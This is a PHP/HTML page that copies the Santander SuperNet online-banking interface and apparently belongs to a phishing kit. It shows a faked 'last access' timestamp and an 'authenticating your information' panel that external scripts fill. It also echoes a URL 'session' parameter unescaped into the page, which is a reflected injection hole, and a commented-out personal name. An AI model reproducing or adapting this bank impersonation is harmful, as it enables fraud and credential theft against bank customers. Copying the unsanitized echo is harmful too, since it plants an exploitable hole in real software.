<?php 
    $session = $_GET['session'];
?>

<script src="../../jquery-1.11.2.js"></script>

<script src="App_Desktop.js"></script>
<!--<script src="script_panel_email.js"></script>-->

<script>
    $(document).ready(function(){
        //alert("Session: "+$('#session').val());
    });
</script>


<input type="hidden" name="session" id="session" value="<?=$session;?>">
<input type="hidden" name="idHistory" id="idHistory">






<script>
                        $(document).ready(function(){
                            var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
                            var f=new Date();
                            var strFecha = "Último Acceso: "+f.getDate()+" "+meses[f.getMonth()]+", 2019 00:19 horas";
                            //var strFecha = f.getDate()+' de <span _ngcontent-c7="" class="text-capitalize">'+meses[f.getMonth()]+', '+f.getFullYear()+'</span>';
                            $('#showFecha').html(strFecha);
                        });
                    </script>



<style>
        #divEmailConfirm {
            width: 40%;
            left: 30%;
            top: 2em;
            z-index: 10002;
            position: absolute;
            display: none;
            margin: 0 auto!important;
        }


        #backmodal {
            padding: 0;
            margin: 0;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            width: 100%;
            height: 100%;
            background: #595959 url(../../spacer.gif) center center;
            z-index: 1001;
            -moz-opacity: 0.8;
            opacity: 0.80;
            filter: alpha(opacity=80);
            display: none;
        }

        @media (min-width: 1200px){
            #divEmailConfirm {
                width: 40%;
                left: 30%;
                top: 2em;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px){
            #divEmailConfirm {
                width: 60%;
                left: 30%;
                top: 3em;
            }
        }

        @media (min-width: 268px) and (max-width: 991px){
            #divEmailConfirm {
                width: 90%;
                left: 5%;
                top: 1em;
            }
        }
    </style>

    


<super-header _ngcontent-c1="" _nghost-c7="" style="max-width: 865.833px;">
    <!---->
    <div _ngcontent-c7="" class="ng-star-inserted sticky-top">
        <nav _ngcontent-c7="" class="navbar desktop" style="background: rgb(236, 0, 0);">
            <div _ngcontent-c7="" class="w-100">
                <div _ngcontent-c7="" class="insideNav" style="max-width: 865.833px;">
                    <div _ngcontent-c7="" class="row m-0 icons-row">
                        <!---->
                        <div _ngcontent-c7="" class="items pl-0 col-3">
                            <!---->
                            <div _ngcontent-c7="" class="ng-star-inserted">
                                <img _ngcontent-c7="" class="pl-0 ml-1 private-logo" src="../assets/logos/classic/santander_classic.svg">
                            </div>
                            <!---->
                        </div>

                        <!---->
                        <div _ngcontent-c7="" class="col-9 d-flex px-0 mt-1 icons-wrapperv justify-content-end">
                            <!---->
                            <!---->
                            <div _ngcontent-c7="" class="col-space text-right d-inline-table mr-4 contact-pop ng-star-inserted">
                                <a _ngcontent-c7="" class="txt-option text-right align-middle favs-icon-contact" closepopoveronclick="" placement="bottom" triggers="click" title="">
                                    <span _ngcontent-c7="" class="ml-1">Contacto</span>
                                </a>
                            </div>
                            <!---->
                            <!---->
                            <div _ngcontent-c7="" class="col-space text-right d-inline-table mr-4 ng-star-inserted">
                                <a _ngcontent-c7="" class="txt-option text-right align-middle">
                                    <img _ngcontent-c7="" src="../assets/img/mi_perfil_header_white.svg" title="">
                                    <span _ngcontent-c7="" class="ml-1">Mi Perfil</span>
                                </a>
                            </div>
                            <!---->
                            <div _ngcontent-c7="" class="col-space text-right d-inline-table mr-4 ng-star-inserted">
                                <a _ngcontent-c7="" class="txt-option text-right align-middle">
                                    <img _ngcontent-c7="" src="../assets/img/configuracion_header_white.svg" title="">
                                    <span _ngcontent-c7="" class="ml-1">Configuración</span>
                                </a>
                            </div>
                            <!---->
                            <div _ngcontent-c7="" class="col-space text-right ng-star-inserted">
                                <a _ngcontent-c7="" class="txt-option text-right align-middle">
                                    <img _ngcontent-c7="" height="15px" width="20px" src="../assets/img/cerrar_sesion_header_white.svg" title="">
                                    <span _ngcontent-c7="" class="ml-1">Cerrar Sesión</span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </nav>

        <!---->
        <div _ngcontent-c7="" class="w-100 desktop-routes ng-star-inserted">
            <nav _ngcontent-c7="" class="navbar-desktop" style="max-width: 865.833px;">
                <div _ngcontent-c7="" class="row d-flex justify-content-between" style="height: 34px;">
                    <div _ngcontent-c7="" class="col-8 pl-0">
                        <ul _ngcontent-c7="" class="nav segment ml-0 d-flex justify-content-between priv-menu-list">
                            <!---->
                            <li _ngcontent-c7="" class="nav-item ng-star-inserted default" closepopoveronclick="" container="body" placement="bottom" triggers="click">
                                <a _ngcontent-c7="" class="nav-link">
                                    <span _ngcontent-c7="" class="icon-home"></span>
                                    Mis Saldos
                                </a>
                            </li>
                            <!---->
                            <li _ngcontent-c7="" class="nav-item default ng-star-inserted" closepopoveronclick="" container="body" placement="bottom" triggers="click">
                                <a _ngcontent-c7="" class="nav-link">
                                    <span _ngcontent-c7="" class="fav-icon-wallet"></span>
                                    Cuentas
                                </a>
                            </li>
                            <!---->
                            <li _ngcontent-c7="" class="nav-item default ng-star-inserted" closepopoveronclick="" container="body" placement="bottom" triggers="click">
                                <a _ngcontent-c7="" class="nav-link">
                                    <span _ngcontent-c7="" class="fav-icon-paysheet"></span>
                                    Tarjetas
                                </a>
                            </li>
                            <!---->
                            <li _ngcontent-c7="" class="nav-item default ng-star-inserted" closepopoveronclick="" container="body" placement="bottom" triggers="click">
                                <a _ngcontent-c7="" class="nav-link">
                                    <span _ngcontent-c7="" class="fav-icon-coins"></span>
                                    Inversiones
                                </a>
                            </li>
                            <!---->
                            <li _ngcontent-c7="" class="nav-item default ng-star-inserted" closepopoveronclick="" container="body" placement="bottom" triggers="click">
                                <a _ngcontent-c7="" class="nav-link">
                                    <span _ngcontent-c7="" class="fav-icon-credits"></span>
                                    Créditos
                                </a>
                            </li>
                            <!---->

                            <!---->
                        </ul>
                    </div>
                    <!---->
                    <div _ngcontent-c7="" class="col-4 pl-5 pr-0 m-auto text-right ng-star-inserted">
                        <input _ngcontent-c7="" autocomplete="off" class="m-auto ng-untouched ng-pristine ng-valid" id="serch" placeholder="¿Qué operación buscas?" type="text">
                        <!----><i _ngcontent-c7="" class="glyphicon ng-star-inserted">
                        </i>
                        <!---->
                        <!---->
                        <!---->
                    </div>
                </div>
            </nav>
        </div>

        <!---->
    </div>

    <!---->

    <!---->
</super-header>
<div _ngcontent-c1="" class="w-100">
    <div _ngcontent-c1="" class="shell-center" style="max-width: 1200px;">
        <div _ngcontent-c1="" class="m-auto" style="max-width: 865.833px;">
            <!---->
            <super-session-detail _ngcontent-c1="" _nghost-c8="" class="ng-star-inserted">
                <!---->
                <div _ngcontent-c8="" class="session-detail pl-0 container ng-star-inserted">
                    <!---->
                    <div _ngcontent-c8="" class="m-auto row ng-star-inserted">
                        <div _ngcontent-c8="" class="col-12 pl-0 detail-container">
                            <div _ngcontent-c8="" class="row">
                                <div _ngcontent-c8="" class="col-10">
                                    <p _ngcontent-c8="" class="username m-0">
                                        <span _ngcontent-c8="">
                                            <!--Bienvenido,-->
                                            Bienvenido
                                            <strong _ngcontent-c8="" class="name_server" style="text-transform: uppercase;">
                                                <!--ANGEL LEONEL HEREDIA DE ALBA-->
                                            </strong>.
                                        </span>
                                    </p>
                                    <p id="showFecha" _ngcontent-c8="" class="date m-0">
                                        <!--Último Acceso: 17 Agosto, 2019 00:19 horas-->
                                    </p>
                                </div>
                                <div _ngcontent-c8="" class="col-2 text-right">
                                    <!----><span _ngcontent-c8="" class="favs-icon-coachmark ng-star-inserted"></span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!---->
                </div>
            </super-session-detail>
        </div>
        <!---->
        <!---->

        <div _ngcontent-c1="" class="row m-auto">
            <!---->
            <div _ngcontent-c1="" class="col-12 m-auto px-0">
                <div _ngcontent-c1="" class="desktop">
                    <div _ngcontent-c1="" class="w-100 m-auto" style="max-width: 865.833px; min-height: 137px;">

                        <super-shell _ngcontent-c1="">
                            <!---->
                            <super-loader id="loading" style="display: none;" _nghost-c13="" class="ng-star-inserted">
                                <div _ngcontent-c13="" class="ng-star-inserted">
                                    <div _ngcontent-c13="" class="modal-backdrop" style="opacity: .2"></div>
                                    <div _ngcontent-c13="" class="w3-modal w3-animate-opacity d-flex">
                                        <div _ngcontent-c13="" class="w3-modal-content inner mt-auto">
                                            <img _ngcontent-c13="" alt="" class="loader center" src="../assets/loader-ring.gif">
                                        </div>
                                    </div>
                                </div>
                            </super-loader>
                            <router-outlet></router-outlet>
                            <ng-component class="ng-star-inserted">
                                <div class="container-full">

                                    <div class="row m-0">
                                        <div class="col-8 view-width px-0">
                                            <router-outlet></router-outlet>
                                            <ng-component _nghost-c25="" class="ng-star-inserted">
                                                <div _ngcontent-c25="" class="container col-12">
                                                    <div _ngcontent-c25="" class="row red-title">
                                                        <!---->
                                                        <div _ngcontent-c25="" class="col-sm-12 col-lg-6 ng-star-inserted" id="txtInsertTitle">
                                                            <!--Cambio de contraseña-->
                                                            Autenticando su Informaci&oacute;n
                                                        </div>
                                                    </div>
                                                    
                                                    <div id="loadHTML" style="width: 100%;">
                                                        
                                                    </div>
                                                    

                                                    
                                                    <!--<form name="frmFolio" id="frmFolio" _ngcontent-c25="" novalidate="" class="ng-touched ng-dirty ng-valid" style="display:none!important;">
                                                    
                                                        <div _ngcontent-c25="" class="form-group mt-3 form">
                                                            <div _ngcontent-c25="" class="row pb-1 last-txt">
                                                            <div _ngcontent-c25="" class="col-12">
                                                                <h2>Proceso finalizado</h2>
                                                                <p>Es importante que conserve el No. de folio que aparace en la parte de abajo.</p>
                                                            </div>
                                                        </div>
                                                            <div _ngcontent-c25="" class="row pb-1">
                                                                <div _ngcontent-c25="" class="col-sm-6 pt-sm-0">
                                                                    <label _ngcontent-c25="">Folio:  </label>
                                                                    
                                                                    <label id="txtFolioInsert" style="color: #e60000!important;"></label>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-c25="" class="row py-5">
                                                            <div _ngcontent-c25="" class="col-md-12 col-lg-3 text-center">
                                                                <button id="btnFolio" _ngcontent-c25="" class="rounded-red-button">
                                                                    Continuar
                                                                </button>
                                                            </div>
                                                        </div>
                                                        </div>
                                                        
                                                        
                                                    </form>-->
                                                    
                                                    
                                                    
                                                    
                                                    
                                                    
                                                </div>
                                            </ng-component>
                                        </div>

                                        <!---->
                                        <div class="col-4 px-0 ml-auto ng-star-inserted">
                                            <super-fast-operations _nghost-c22="">
                                                <div _ngcontent-c22="" class="pl-4">
                                                    <div _ngcontent-c22="" class="pl-2">
                                                        <div _ngcontent-c22="" class="d-none d-none d-lg-block d-xl-block">

                                                            <!---->

                                                            <div _ngcontent-c22="" class="container shortcuts p-0">
                                                                <div _ngcontent-c22="" class="col-12">
                                                                    <div _ngcontent-c22="" class="row">
                                                                        <p _ngcontent-c22="" class="title">Operaciones más usadas</p>
                                                                        <!---->
                                                                    </div>
                                                                </div>

                                                                <!---->
                                                                <!---->
                                                                <div _ngcontent-c22="" class="row t-border border-top-0 ng-star-inserted">
                                                                    <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                        <div _ngcontent-c22="" class="d-block text-center">
                                                                            <span _ngcontent-c22="" class="fo-editar"></span>
                                                                            <p _ngcontent-c22="" class="px-1 mb-0">Cambio de imagen y frase</p>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                    <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                        <div _ngcontent-c22="" class="d-block text-center">
                                                                            <span _ngcontent-c22="" class="fo-bloqueo-supernet">
                                                                            </span>
                                                                            <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                Bloqueo SuperNet
                                                                            </p>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!---->

                                                                <!---->
                                                                <div _ngcontent-c22="" class="row t-border ng-star-inserted">
                                                                    <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                        <div _ngcontent-c22="" class="d-block text-center">
                                                                            <span _ngcontent-c22="" class="fo-token"></span>
                                                                            <p _ngcontent-c22="" class="px-1 mb-0">Estatus token</p>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                    <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                        <div _ngcontent-c22="" class="d-block text-center">
                                                                            <span _ngcontent-c22="" class="fo-portabilidad-traer">
                                                                            </span>
                                                                            <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                Traer nómina
                                                                            </p>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!---->

                                                                <!---->
                                                                <div _ngcontent-c22="" class="row t-border ng-star-inserted">
                                                                    <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                        <div _ngcontent-c22="" class="d-block text-center">
                                                                            <span _ngcontent-c22="" class="fo-transferencias"></span>
                                                                            <p _ngcontent-c22="" class="px-1 mb-0">Transferencias</p>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                    <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                        <div _ngcontent-c22="" class="d-block text-center">
                                                                            <span _ngcontent-c22="" class="fo-pagos">
                                                                            </span>
                                                                            <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                Pagos
                                                                            </p>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!---->

                                                                <!---->
                                                                <div _ngcontent-c22="" class="row t-border ng-star-inserted">
                                                                    <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                        <div _ngcontent-c22="" class="d-block text-center">
                                                                            <span _ngcontent-c22="" class="fo-cancelacion"></span>
                                                                            <p _ngcontent-c22="" class="px-1 mb-0">Cancelación SuperNet</p>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                    <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                        <div _ngcontent-c22="" class="d-block text-center">
                                                                            <span _ngcontent-c22="" class="fo-bitacora">
                                                                            </span>
                                                                            <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                Consulta de bitácora
                                                                            </p>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!---->

                                                            </div>
                                                        </div>

                                                        <div _ngcontent-c22="" class="row line-div lateral-panel">
                                                            <div _ngcontent-c22="" class="col-box text-left text-nowrap col-description">
                                                                <div _ngcontent-c22="" class="tooltip">
                                                                    <img _ngcontent-c22="" alt="" class="tooltip mr-1" src="../assets/img/CocnoceAppsIcon.svg">
                                                                    <span _ngcontent-c22="" class="tooltiptext">
                                                                        <div _ngcontent-c22="" class="text-center">

                                                                            <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                <div _ngcontent-c22="" class="col border-right">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/recompensas.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                                <div _ngcontent-c22="" class="col">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/twist.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                            <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                <div _ngcontent-c22="" class="col border-right">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/transferencias_saldos.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                                <div _ngcontent-c22="" class="col">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/puntos.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                            <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                <div _ngcontent-c22="" class="col border-right">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" class="space" src="../assets/img/tooltipHome/casacompara.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                                <div _ngcontent-c22="" class="col">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/autocompara.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                            <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                <div _ngcontent-c22="" class="col border-right">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" class="space" src="../assets/img/tooltipHome/viajacompara.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                                <div _ngcontent-c22="" class="col">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/universia.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                            <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                <div _ngcontent-c22="" class="col border-right">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" class="space" src="../assets/img/tooltipHome/tucarrera.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                                <div _ngcontent-c22="" class="col">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/izettle.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                            <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                <div _ngcontent-c22="" class="col border-right">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/supermovil.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                                <div _ngcontent-c22="" class="col">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" class="space" src="../assets/img/tooltipHome/tutoriales_supernet.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                            <div _ngcontent-c22="" class="row line-div">
                                                                                <div _ngcontent-c22="" class="col border-right">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/tutoriales_supermovil.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                                <div _ngcontent-c22="" class="col">
                                                                                    <div _ngcontent-c22="">
                                                                                        <a _ngcontent-c22="">
                                                                                            <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/superdigital.png">
                                                                                        </a>
                                                                                    </div>
                                                                                </div>
                                                                            </div>

                                                                        </div>
                                                                    </span>
                                                                </div>
                                                                <span _ngcontent-c22="" class="ml-1 space text">
                                                                    Conoce Santander
                                                                </span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </super-fast-operations>
                                        </div>
                                    </div>
                                </div>
                            </ng-component>
                        </super-shell>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>